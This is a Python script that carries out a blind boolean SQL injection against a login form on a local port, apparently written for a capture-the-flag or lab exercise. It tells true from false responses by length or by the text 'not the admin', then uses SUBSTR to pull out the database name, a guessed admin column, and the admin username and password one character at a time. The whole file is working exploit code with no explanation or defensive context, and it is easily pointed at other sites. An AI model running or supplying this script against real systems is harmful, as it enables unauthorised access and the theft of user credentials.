import requests
import string
import time

target = "http://127.0.0.1:32895/index.php"

print("[*] Starting blind SQLi extraction...")
print(f"[*] Target: {target}\n")

# Simple test function
def check(condition):
    payload = f"admin' AND {condition}-- -"
    try:
        r = requests.get(target, params={'username': payload, 'password': 'x'}, timeout=3)
        return r.text
    except:
        return None

# Baseline test
print("[*] Testing detection method...")
r_true = check("1=1")
r_false = check("1=0")

if r_true and r_false:
    if len(r_true) != len(r_false):
        print(f"[+] Detection: response length (True:{len(r_true)}, False:{len(r_false)})")
        is_match = lambda c: len(check(c)) == len(r_true) if check(c) else False
    elif "not the admin" in r_true:
        print("[+] Detection: 'not the admin' in response")
        is_match = lambda c: "not the admin" in (check(c) or "")
    else:
        print("[-] Cannot detect")
        exit(1)
else:
    print("[-] Connection error")
    exit(1)

# Extract data
def extract(query, max_len=50):
    result = ""
    charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + '_@.-!#$%^&*()'
    for pos in range(1, max_len+1):
        found = False
        for ch in charset:
            if ch == "'":
                cond = f"SUBSTR(({query}),{pos},1)=CHAR(39)"
            else:
                cond = f"SUBSTR(({query}),{pos},1)='{ch}'"
            if is_match(cond):
                result += ch
                print(f"  Position {pos}: {ch} -> {result}")
                found = True
                break
        if not found:
            break
    return result

# Database name
print("\n[1] Extracting database name...")
db = extract("SELECT DATABASE()", 30)
print(f"[+] Database: {db}\n")

# Admin field check
print("[2] Finding admin field...")
admin_field = None
for field in ['is_admin', 'admin', 'isadmin', 'role']:
    if is_match(f"(SELECT {field} FROM users WHERE username='admin')=1"):
        admin_field = field
        print(f"[+] Admin field found: {field}\n")
        break

# Extract admin username
if admin_field:
    print(f"[3] Extracting admin username (WHERE {admin_field}=1)...")
    username = extract(f"SELECT username FROM users WHERE {admin_field}=1", 40)
    print(f"[+++] Admin username: {username}\n")
    
    # Extract admin password
    print("[4] Extracting admin password...")
    password = extract(f"SELECT password FROM users WHERE {admin_field}=1", 70)
    print(f"[+++] Admin password: {password}\n")
else:
    print("[-] Admin field not found, extracting first username...")
    username = extract("SELECT username FROM users LIMIT 1", 40)
    print(f"[+] First username: {username}\n")

print("[*] Extraction complete!")

